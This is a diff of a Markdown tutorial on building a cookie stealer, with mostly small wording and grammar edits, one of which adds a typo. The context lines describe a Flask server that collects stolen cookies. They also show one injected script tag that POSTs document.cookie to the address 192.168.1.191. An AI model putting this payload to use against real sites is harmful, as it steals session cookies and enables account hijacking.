@@ -63,7 +63,7 @@ pip install -r pip.req
 
 # Building a Simple Cookie Stealer (no redirect)
 
-All cookie stealers have two components. The first component is a server that stores stolen cookies in some kind of file or database. The second component is malicious javascript that is injected into the target webpage. When the victim loads the infected web page, the malicious javascript makes a GET or POST request to the server, passing the victim’s  cookies as a request parameter. The server then logs the cookies in a file or database. 
+All cookie stealers have two components. The first component is a server that stores stolen cookies in some kind of file or database. The second component is malicious Javascript code that is injected into the target webpage. When the victim loads the infected web page, the malicious Javascript code makes a GET or POST request to the server, passing the victim’s  cookies as a request parameter. The server then logs the cookies in a file or database. 
 
 Let's build a simple cookie stealer that follows this model. In our project directory, create a new file named 'no-redirect.py'.
 
@@ -73,7 +73,7 @@ touch no-redirect.py
 
 {% endhighlight %}
 
-Let's then open up no-redirect.py in a text editor such as vim, and the following lines of code to the top of the file to import Flask and Flask-CORS.
+Let's then open up no-redirect.py in a text editor such as vim, and add the following lines of code to the top of the file to import Flask and Flask-CORS.
 
 
 {% highlight python %}
@@ -82,7 +82,7 @@ from flask.ext.cors import CORS
 
 {% endhighlight %}
 
-We're then going to instantiate a new Flask object. Flask objects can be thought of as lightweight HTTP servers responsible for handling incoming HTTP requests.
+Next, we instantiate a new Flask object. Flask objects can be thought of as lightweight HTTP servers responsible for handling incoming HTTP requests.
 
 {% highlight python %}
 
@@ -290,7 +290,7 @@ The code shown above simply creates a new XMLHttpRequest objects, initializes a 
 <script> var xmlhttp = new XMLHttpRequest(); xmlhttp.open("POST", "http://192.168.1.191/update", true); xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie})); </script>
 {% endhighlight %}
 
-The Python script that acts as our cookie stealer's server is similar to the ones we created before. Its distinctive characteristics are that it accepts 'POST' requests and grabs the cookies from the JSON POST data as opposed to the query string.
+The Python script that acts as our cookie stealer's server is smilar to the ones we created before. Its distinctive characteristics are that it accepts 'POST' requests and grabs the cookies from the JSON POST data as opposed to the query string.
 
 {% highlight python %}
 
